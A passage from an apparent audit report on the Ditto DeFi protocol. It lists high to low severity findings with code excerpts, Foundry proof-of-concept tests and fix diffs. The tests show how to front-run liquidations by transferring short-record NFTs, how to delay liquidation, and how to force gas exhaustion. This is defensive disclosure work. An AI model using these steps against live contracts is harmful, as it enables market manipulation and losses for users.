+        assertEq(diamond.getFlaggerIdCounter(), 2);
+        assertEq(shortRecord1.flaggerId, 1);
+        assertEq(diamond.getFlagger(shortRecord1.flaggerId), flagger1);
+
+        skip(TEN_HRS_PLUS);
+        setETH(2500 ether);
+
+        //attempting direct liquidation by flagger2 fails since only allowed to flagger1
+
+        //add ask order to liquidate against
+        fundLimitAskOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
+
+        uint16[] memory shortHintArray = setShortHintArray();
+        vm.prank(flagger2);
+        vm.expectRevert(Errors.MarginCallIneligibleWindow.selector);
+        diamond.liquidate(asset, sender, shortRecord1.id, shortHintArray);
+
+        //cancel the previously created ask order
+        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
+
+        //reset
+        setETH(4000 ether);
+
+        //create another short
+        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
+        fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, sender);
+        STypes.ShortRecord memory shortRecord2 =
+            diamond.getShortRecord(asset, sender, Constants.SHORT_STARTING_ID + 1);
+
+        assertEq(diamond.getFlaggerIdCounter(), 2);
+        assertEq(shortRecord2.flaggerId, 0);
+        assertEq(diamond.getFlagger(shortRecord2.flaggerId), address(0));
+
+        //flag second short by providing flagger id of flagger1. this resets the flagger id
+        setETH(2500 ether);
+        vm.prank(flagger2);
+        diamond.flagShort(
+            asset, sender, Constants.SHORT_STARTING_ID + 1, uint16(shortRecord1.flaggerId)
+        );
+        shortRecord2 =
+            diamond.getShortRecord(asset, sender, Constants.SHORT_STARTING_ID + 1);
+
+        //flagger1 has been replaced
+        assertEq(diamond.getFlaggerIdCounter(), 2);
+        assertEq(shortRecord2.flaggerId, 1);
+        assertEq(diamond.getFlagger(shortRecord2.flaggerId), flagger2);
+        assertEq(diamond.getFlagger(shortRecord1.flaggerId), flagger2);
+
+        //ask to liquidate against
+        fundLimitAskOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
+
+        //now flagger1 cannot liquidate shortRecord1
+        vm.prank(flagger1);
+        vm.expectRevert(Errors.MarginCallIneligibleWindow.selector);
+        diamond.liquidate(asset, sender, shortRecord1.id, shortHintArray);
+
+        //but flagger1 can
+        vm.prank(flagger2);
+        diamond.liquidate(asset, sender, shortRecord1.id, shortHintArray);
+    }
+
     function test_FlagShort_FlaggerId_Recycling_AfterIncreaseCollateral() public {
         createAndFlagShort();
 

```

## Impact

First flagger will be in loss of the spent gas and expected reward.

## Recommendation

Update the check to `secondLiquidationTime`
```diff
diff --git a/contracts/libraries/LibShortRecord.sol b/contracts/libraries/LibShortRecord.sol
index 7c5ecc3..c8736b0 100644
--- a/contracts/libraries/LibShortRecord.sol
+++ b/contracts/libraries/LibShortRecord.sol
@@ -391,7 +391,7 @@ library LibShortRecord {
                     - s.assetUser[cusd][flaggerToReplace].g_updatedAt
                 : 0;
             //@dev re-use an inactive flaggerId
-            if (timeDiff > LibAsset.firstLiquidationTime(cusd)) {
+            if (timeDiff > LibAsset.secondLiquidationTime(cusd)) {
                 delete s.assetUser[cusd][flaggerToReplace].g_flaggerId;
                 short.flaggerId = flagStorage.g_flaggerId = flaggerHint;
             } else if (s.flaggerIdCounter < type(uint16).max) {

```

# <a id='H-06'></a>H-06 Certain user's may be able to leverage short order fills to delay primary liquidation on 254th

## Severity

High

## Vulnerability

When a partially filled short order gets filled again, the `updatedAt` timestamp of the associated short record is updated which resets the time required for primary liquidation even if the collateral ratio is below the liquidation threshold. 
```solidity
    function fillShortRecord(
        address asset,
        address shorter,
        uint8 shortId,
        SR status,
        uint88 collateral,
        uint88 ercAmount,
        uint256 ercDebtRate,
        uint256 zethYieldRate
    ) internal {
        
        // more code

        // @audit the time is updated

        LibShortRecord.merge(
            short,
            ercAmount,
            ercDebtSocialized,
            collateral,
            yield,
            LibOrders.getOffsetTimeHours()
        );
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L153-L181

Although ordinary short records have one-to-one mapping with short orders, the short record at id == 254, can have multiple short orders associated with it. This can make it possible for some type of user's to keep a calculated low collateral ratio and offset the primary liquidation through the creation of short orders. 
If the account is an entity that manages shorting/funds of several people, it can park the first 253 slots and make its regular short openings via id == 254 hence resetting the `updatedAt` frequently making primary liquidations not possible.

### Cost calculation
```
minBid eth : .001 
cratio max : 15 
minShort : 2000 

Short for 2000 usd at 5x initial margin and exit leaving minBid amount in ShortRecord => collateral per short record == 0.005 eth

Overcollateralize by 3 times to prevent liquidation on these orders => 0.015 eth
To park 252 short orders: 252 * 0.015 = 3.78 eth

Gas to create short 252 times and exit short wallet 252 times : (102596 + 44613) * 252 == 37096668
Considering gas to be 100gwei, gas cost => ( 37096668 * 100000000000 / 1e18 ) == 3 eth
Considering eth == 1700 usd,
Total cost = 1700 * 6.78 == 11526 usd
```

## Impact

Some users may be able to sustain a collateral ratio < primary liquidation threshold for a long time.

## Recommendation

If deciding to mitigate this issue, a separate mapping could be created containing the flag times for each shortRecord.

# <a id='H-07'></a>H-07 User's can prevent getting flagged/liquidated by transferring the ShortRecord

## Severity

High

## Vulnerability

ShortRecords with minted NFT's can be transferred even if the collateral ratio is below the liquidation thresholds. 
```solidity
    function transferShortRecord(
        address asset,
        address from,
        address to,
        uint40 tokenId,
        STypes.NFT memory nft
    ) internal {
        AppStorage storage s = appStorage();
        STypes.ShortRecord storage short = s.shortRecords[asset][from][nft.shortRecordId];

       // @audit doesn't check for collateral raio

        if (short.status == SR.Cancelled) revert Errors.OriginalShortRecordCancelled();
        if (short.flaggerId != 0) revert Errors.CannotTransferFlaggedShort();

        deleteShortRecord(asset, from, nft.shortRecordId);
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L120-L132

This allows an user having a ShortRecord with low collateral ratio to transfer it to another of their own address by front running a flag/liquidation. Since the flagger/liquidator has to pass in the `(shorter,id)` to specify the short, any attempt to flag/liquidate the short will fail.
```solidity
    function flagShort(address asset, address shorter, uint8 id, uint16 flaggerHint)
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/MarginCallPrimaryFacet.sol#L43C36-L43C36

### POC Test
```diff
diff --git a/test/MarginCallFlagShort.t.sol b/test/MarginCallFlagShort.t.sol
index 906657e..9032395 100644
--- a/test/MarginCallFlagShort.t.sol
+++ b/test/MarginCallFlagShort.t.sol
@@ -101,6 +101,36 @@ contract MarginCallFlagShortTest is MarginCallHelper {
         assertEq(diamond.getFlagger(shortRecord.flaggerId), extra);
     }
 
+    function test_Revert_FlaggerMovesTheToken() external {
+        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
+        fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, sender);
+        STypes.ShortRecord memory shortRecord =
+            diamond.getShortRecord(asset, sender, Constants.SHORT_STARTING_ID);
+
+        assertEq(diamond.getFlaggerIdCounter(), 1);
+        assertEq(shortRecord.flaggerId, 0);
+        assertEq(diamond.getFlagger(shortRecord.flaggerId), address(0));
+
+        //make short flaggable
+        skip(2 hours);
+        setETH(2500 ether);
+
+        //owner transfers the short before user flags
+        address senderAlternativeAddress = address(314);
+        vm.startPrank(sender);
+        diamond.mintNFT(asset,Constants.SHORT_STARTING_ID);
+        shortRecord =
+            diamond.getShortRecord(asset, sender, Constants.SHORT_STARTING_ID);
+        diamond.transferFrom(sender,senderAlternativeAddress,shortRecord.tokenId);
+        vm.stopPrank();
+
+        //the tx to flag short fails due to changed ownership of short
+        vm.prank(extra);
+        vm.expectRevert(Errors.InvalidShortId.selector);
+        diamond.flagShort(asset, sender, Constants.SHORT_STARTING_ID, Constants.HEAD);
+
+    }
+
     function checkShortRecordAfterReset() public {
         STypes.ShortRecord memory shortRecord =
             diamond.getShortRecord(asset, sender, Constants.SHORT_STARTING_ID);
```

## Impact

Flaggers/liquidators might end up wasting gas without flagging/liquidating the short record and the system will have low collateral ratio.

## Recommendation

Disallow transferring a short record if the collateral ratio is below the primary liquidation threshold.
```diff
diff --git a/contracts/libraries/LibShortRecord.sol b/contracts/libraries/LibShortRecord.sol
index 7c5ecc3..9953d34 100644
--- a/contracts/libraries/LibShortRecord.sol
+++ b/contracts/libraries/LibShortRecord.sol
@@ -128,6 +128,10 @@ library LibShortRecord {
         STypes.ShortRecord storage short = s.shortRecords[asset][from][nft.shortRecordId];
         if (short.status == SR.Cancelled) revert Errors.OriginalShortRecordCancelled();
         if (short.flaggerId != 0) revert Errors.CannotTransferFlaggedShort();
+        if (
+            getCollateralRatioSpotPrice(short, LibOracle.getSavedOrSpotOraclePrice(asset))
+                < LibAsset.primaryLiquidationCR(asset)
+        ) revert Errors.InsufficientCollateral();
 
         deleteShortRecord(asset, from, nft.shortRecordId);
```

# <a id='M-01'></a>M-01 Secondary liquidations can revert due to difference in used oracle price

## Severity

Medium

## Vulnerability

In `liquidateSecondary` the collateral ratio is calculated using `LibOracle.getSavedOrSpotOraclePrice()`. 
```solidity
    function liquidateSecondary(
        address asset,
        MTypes.BatchMC[] memory batches,
        uint88 liquidateAmount,
        bool isWallet
    ) external onlyValidAsset(asset) isNotFrozen(asset) nonReentrant {
        STypes.AssetUser storage AssetUser = s.assetUser[asset][msg.sender];
        MTypes.MarginCallSecondary memory m;
        uint256 minimumCR = LibAsset.minimumCR(asset);
       
         // @audit oracle price obtained using LibOracle.getSavedOrSpotOraclePrice()

         uint256 oraclePrice = LibOracle.getSavedOrSpotOraclePrice(asset);
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/MarginCallSecondaryFacet.sol#L38-L47

While in `_secondaryLiquidationHelper`, the collateral amount corresponding to the debt is calculated using `LibOracle.getPrice()`. 
```solidity
    function _secondaryLiquidationHelper(MTypes.MarginCallSecondary memory m) private {
        // @dev when cRatio <= 1 liquidator eats loss, so it's expected that only TAPP would call
        m.liquidatorCollateral = m.short.collateral;

        // @audit oracle price obtained using LibOracle.getPrice()

        if (m.cRatio > 1 ether) {
            uint88 ercDebtAtOraclePrice =
                m.short.ercDebt.mulU88(LibOracle.getPrice(m.asset)); // eth
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/MarginCallSecondaryFacet.sol#L162-L168

Since `LibOracle.getSavedOrSpotOraclePrice()` doesn't save the price, a possible mismatch in these prices can result in the transaction reverting when attempting to subtract `ercDebtAtOraclePrice` from `m.short.collateral`
```solidity
    function _secondaryLiquidationHelper(MTypes.MarginCallSecondary memory m) private {
  
        // more code

        if (m.cRatio > 1 ether) {
            
            @audit wrong assumption of m.short.collateral > ercDebtAtOraclePrice due oracle price difference

            s.vaultUser[m.vault][remainingCollateralAddress].ethEscrowed +=
                m.short.collateral - ercDebtAtOraclePrice;

         // more code
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/MarginCallSecondaryFacet.sol#L162-L177

### Example scenario:
1. A user calls liquidateSecondary on a postion with `debt = 1` and  `collateral = 2001`
2. The currently saved oracle price is `2020` but was fetched more than 15mins ago. Hence the oracle price used to calculate the `collateralRatio` is fetched from Chainlink and returns `2000`. Hence the collateral ratio calculated is above 1 (2001/2000 > 1).
3. Inside the `_secondaryLiquidationHelper`, since the collateral ratio is more than 1, the remaining collateral is calculated using the following equation
`m.short.collateral - ercDebtAtOraclePrice`. The `ercDebtAtOraclePrice` is calculated using the previously saved oracle price which is `2020` which will result in `ercDebtAtOraclePrice` being `2020 * 1 == 2020`.
4. The transaction will revert when performing `2000 - 2020`

## Impact

Some secondary liquidations can get reverted for a brief period of time until the oracle price matches up.

## Recommendation

Use the price obtained using `LibOracle.getSavedOrSpotOraclePrice()` in both places.

# <a id='M-02'></a>M-02 Order creation can run out of gas since relying on previous order matchtype

## Severity

Medium

## Vulnerability

If the hint order id has been reused and the previous order type is `matched` the current code iterates from the head of the linked list under the assumption that `since the previous order has been matched it must have been at the top of the orderbook which would mean the new order with a similar price would also be somewhere near the top of the orderbook`. 
```solidity
    function findOrderHintId(
        mapping(address => mapping(uint16 => STypes.Order)) storage orders,
        address asset,
        MTypes.OrderHint[] memory orderHintArray
    ) internal returns (uint16 hintId) {

          // more code

          // @audit if a reused order's prevOrderType is matched, returns HEAD

          if (hintOrderType == O.Cancelled || hintOrderType == O.Matched) {
                emit Events.FindOrderHintId(0);
                continue;
            } else if (
                orders[asset][orderHint.hintId].creationTime == orderHint.creationTime
            ) {
                emit Events.FindOrderHintId(1);
                return orderHint.hintId;
            } else if (orders[asset][orderHint.hintId].prevOrderType == O.Matched) {
                //@dev If hint was prev matched, it means that the hint was close to HEAD and therefore is reasonable to use HEAD
                emit Events.FindOrderHintId(2);
                return Constants.HEAD;
            }
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibOrders.sol#L927-L947

But it is possible that the initial order was cancelled and the id reused multiple times with the previous order being close to the market price resulting in a match. This can lead to a possible exhaustion of gas if the user's order has a price far from the top of the orderbook.

### Example scenario
1. Current state of bids in orderbook:
    1. Top bid 2000
    2. Total bids 1000
    3. Bids ids are from 100 to 999. No order is cancelled and reusable.
2. A user wants to bid at 1700 which would be the 800th order pricewise.
3. User calls `createBid` passing in `[799,798]` for the orderHintArray.
4. The following tx's occur in the same block before the user's `createBid` call in the following order.
    1. Order id `799` gets cancelled.
    2. Another user creates a limit order at `2001` which now has order id `799` since it is reused.
    3. A market/new limit ask order fills the bid.
    4. Another user creates a limit order at price `1800`.
5. In `createBid` when finding the hint id, the condition `prevOrderType == O.Matched` will pass and the hintId returned will be the `HEAD`. 
6. The loop starts to check for the price match from `HEAD` and exhausts gas before iterating over 800 bids.

### Test Code
Add the following change in test/AskSellOrders.t.sol and run
```diff
diff --git a/test/AskSellOrders.t.sol b/test/AskSellOrders.t.sol
index 4e8a4a9..264ea32 100644
--- a/test/AskSellOrders.t.sol
+++ b/test/AskSellOrders.t.sol
@@ -8,7 +8,7 @@ import {Errors} from "contracts/libraries/Errors.sol";
 import {STypes, MTypes, O} from "contracts/libraries/DataTypes.sol";
 
 import {OBFixture} from "test/utils/OBFixture.sol";
-// import {console} from "contracts/libraries/console.sol";
+import {console} from "contracts/libraries/console.sol";
 
 contract SellOrdersTest is OBFixture {
     using U256 for uint256;
@@ -59,6 +59,49 @@ contract SellOrdersTest is OBFixture {
         assertEq(asks[0].price, DEFAULT_PRICE);
     }
 
+    function testPossibleOutOfGasInLoopDueToHighIterations() public {
+        for (uint256 i = 0; i < 1000; i++) {
+            fundLimitAskOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, sender);
+        }
+
+        // a new order at the bottom of the order book
+        fundLimitAskOpt(HIGHER_PRICE, DEFAULT_AMOUNT, sender);
+        assertTrue(getAsks()[1000].price == HIGHER_PRICE);
+        assertTrue(getAsks()[1000].ercAmount == DEFAULT_AMOUNT);
+
+        // user wants to create an order at HIGHER_PRICE
+        MTypes.OrderHint[] memory orderHintArray =
+            diamond.getHintArray(asset, HIGHER_PRICE, O.LimitAsk);
+        uint16 targetOrderId = orderHintArray[0].hintId;
+        assertTrue(targetOrderId == getAsks()[1000].id);
+
+        // the target order gets cancelled
+        vm.prank(sender);
+        cancelAsk(targetOrderId);
+
+        // a person creates a limit ask which reuses the cancelled order id
+        fundLimitAskOpt(LOWER_PRICE, DEFAULT_AMOUNT, sender);
+        assertTrue(getAsks()[0].id == targetOrderId);
+
+        // a bid matches the targetId
+        fundLimitBid(LOWER_PRICE, DEFAULT_AMOUNT, receiver);
+
+        // another person creates a limit ask which reuses the matched order id
+        fundLimitAskOpt(LOWER_PRICE, DEFAULT_AMOUNT, sender);
+        assertTrue(getAsks()[0].id == targetOrderId);
+
+        // the tx of the user goes through
+        depositUsd(sender, DEFAULT_AMOUNT);
+        vm.prank(sender);
+        uint256 gasStart = gasleft();
+        diamond.createAsk(
+            asset, HIGHER_PRICE, DEFAULT_AMOUNT, Constants.LIMIT_ORDER, orderHintArray
+        );
+        uint256 gasUsed = gasStart - gasleft();
+        assertGt(gasUsed, 2_000_000);
+        console.log(gasUsed);
+    }
+
     function testAddingLimitSellAskUsdGreaterThanBidUsd() public {
         fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
         fundLimitAskOpt(DEFAULT_PRICE, DEFAULT_AMOUNT * 2, sender);
```

## Impact

Order creation can run out-of-gas on particular flow

## Recommendation

I think the probability of the above scenario is higher than that of multiple user's cancelling their orders. Hence moving to the next hint order as soon as the current hint order has been found to be reused could be better and will cost less gas on error.

# <a id='L-01'></a>L-01 User's can loose their combined collateral if first id is passed twice in `combineShorts`

## Severity

Low

## Vulnerability

When combining short orders, the `ids` array is not checked for duplication nor is the current status of the first short checked right before the merge or inside the merge function itself.
```
    function combineShorts(address asset, uint8[] memory ids)
        external
        isNotFrozen(asset)
        nonReentrant
        onlyValidShortRecord(asset, msg.sender, ids[0])
    {
        
        // more code

        // @audit id is not checked for duplication of first id.

        for (uint256 i = ids.length - 1; i > 0; i--) {
            uint8 _id = ids[i];
            _onlyValidShortRecord(_asset, msg.sender, _id);

        // more code            

        // @audit current status of firstShort not checked

        // Merge all short records into the short at position id[0]
        firstShort.merge(ercDebt, ercDebtSocialized, collateral, yield, c.shortUpdatedAt);
``` 
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/ShortRecordFacet.sol#L117C14-L176

Hence the `firstId` could repeat in the `ids` array, which will cause the `firstShort` to be marked cancelled inside the loop but still proceed to merge with the `firstShort`. 

### POC Test
```diff
diff --git a/test/Shorts.t.sol b/test/Shorts.t.sol
index f1c3927..88ef28a 100644
--- a/test/Shorts.t.sol
+++ b/test/Shorts.t.sol
@@ -378,6 +378,39 @@ contract ShortsTest is OBFixture {
         );
     }
 
+    function test_CombiningReapeatedFirstLeadsToLoss() public {
+        fundLimitBidOpt(SHORT1_PRICE, DEFAULT_AMOUNT, receiver);
+        fundLimitShortOpt(SHORT1_PRICE, DEFAULT_AMOUNT, sender);
+        STypes.ShortRecord memory shortRecord1BeforeCombine =
+            getShortRecord(sender, Constants.SHORT_STARTING_ID);
+
+        fundLimitBidOpt(SHORT1_PRICE, DEFAULT_AMOUNT, receiver);
+        fundLimitShortOpt(SHORT1_PRICE, DEFAULT_AMOUNT, sender);
+        STypes.ShortRecord memory shortRecord2BeforeCombine =
+            getShortRecord(sender, Constants.SHORT_STARTING_ID + 1);
+
+        //providing the 1st short twice in the array
+        vm.prank(sender);
+        uint8[] memory shortRecords = new uint8[](3);
+        shortRecords[0] = shortRecord1BeforeCombine.id;
+        shortRecords[1] = shortRecord1BeforeCombine.id;
+        shortRecords[2] = shortRecord2BeforeCombine.id;
+        diamond.combineShorts(asset, shortRecords);
+
+        STypes.ShortRecord memory shortRecord1AfterCombine =
+            getShortRecord(sender, shortRecord1BeforeCombine.id);
+        STypes.ShortRecord memory shortRecord2AfterCombine =
+            getShortRecord(sender, shortRecord2BeforeCombine.id);
+
+        //the short records are cancelled and the entire collateral is in the cancelled shortRecord1
+        assertEq(shortRecord1AfterCombine.status == SR.Cancelled, true);
+        assertEq(shortRecord2AfterCombine.status == SR.Cancelled, true);
+        assertEq(
+            shortRecord1AfterCombine.collateral,
+            shortRecord1BeforeCombine.collateral + shortRecord1BeforeCombine.collateral + shortRecord2BeforeCombine.collateral
+        );
+    }
+
     //////Combine Shorts//////
     function testCombineShortsx2() public {
         makeShorts();

```

## Impact

Loss of user's collateral

## Recommendation

Validate if the firstId repeats in the array or check the status of the firstShort just before merge.
```diff
diff --git a/contracts/facets/ShortRecordFacet.sol b/contracts/facets/ShortRecordFacet.sol
index 3fe7e18..44058a6 100644
--- a/contracts/facets/ShortRecordFacet.sol
+++ b/contracts/facets/ShortRecordFacet.sol
@@ -6,7 +6,7 @@ import {U256, U80, U88} from "contracts/libraries/PRBMathHelper.sol";
 import {Errors} from "contracts/libraries/Errors.sol";
 import {Events} from "contracts/libraries/Events.sol";
 import {Modifiers} from "contracts/libraries/AppStorage.sol";
-import {STypes, MTypes} from "contracts/libraries/DataTypes.sol";
+import {STypes, SR, MTypes} from "contracts/libraries/DataTypes.sol";
 import {LibAsset} from "contracts/libraries/LibAsset.sol";
 import {LibShortRecord} from "contracts/libraries/LibShortRecord.sol";
 import {LibOracle} from "contracts/libraries/LibOracle.sol";
@@ -172,6 +172,10 @@ contract ShortRecordFacet is Modifiers {
             LibShortRecord.deleteShortRecord(_asset, msg.sender, _id);
         }
 
+        //check for cancellation
+        if (firstShort.status == SR.Cancelled) {
+            revert("Duplicate First Short Id");
+        }
         // Merge all short records into the short at position id[0]
         firstShort.merge(ercDebt, ercDebtSocialized, collateral, yield, c.shortUpdatedAt);
```

# <a id='L-02'></a>L-02 Loss of precision in `twapPriceInEther` due to division before multiplication

## Severity

Low

## Vulnerability

When calculating `twapPriceInEther`, `twapPrice` is divided by 1e6 before multiplication with 1e18 is done.
```solidity
    function baseOracleCircuitBreaker(
        uint256 protocolPrice,
        uint80 roundId,
        int256 chainlinkPrice,
        uint256 timeStamp,
        uint256 chainlinkPriceInEth
    ) private view returns (uint256 _protocolPrice) {
        
        // more code

        if (invalidFetchData || priceDeviation) {
            uint256 twapPrice = IDiamond(payable(address(this))).estimateWETHInUSDC(
                Constants.UNISWAP_WETH_BASE_AMT, 30 minutes
            );
            uint256 twapPriceInEther = (twapPrice / Constants.DECIMAL_USDC) * 1 ether;
```
https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibOracle.sol#L64-L85

According to the above calculation, the `twapPrice` obtained would be precise upto 6 decimal places. Performing division before multiplying with 1e18 will result in loss of this precision and. 

### Example Scenario
```
twapPrice = 1902501929
twapPriceInEther = 1902000000000000000000

// if multiplication is performed earlier,
twapPriceInEther = 1902501929000000000000
```

## Impact

Price used can have -1 (in 18 decimals) difference from the original price.

## Recommendation

Perform the multiplication before division.
```diff
diff --git a/contracts/libraries/LibOracle.sol b/contracts/libraries/LibOracle.sol
index 23d1d0a..6962ad7 100644
--- a/contracts/libraries/LibOracle.sol
+++ b/contracts/libraries/LibOracle.sol
@@ -82,7 +82,7 @@ library LibOracle {
             uint256 twapPrice = IDiamond(payable(address(this))).estimateWETHInUSDC(
                 Constants.UNISWAP_WETH_BASE_AMT, 30 minutes
             );
-            uint256 twapPriceInEther = (twapPrice / Constants.DECIMAL_USDC) * 1 ether;
+            uint256 twapPriceInEther = (twapPrice * 1 ether) / Constants.DECIMAL_USDC;
             uint256 twapPriceInv = twapPriceInEther.inv();
             if (twapPriceInEther == 0) {
                 revert Errors.InvalidTwapPrice();
```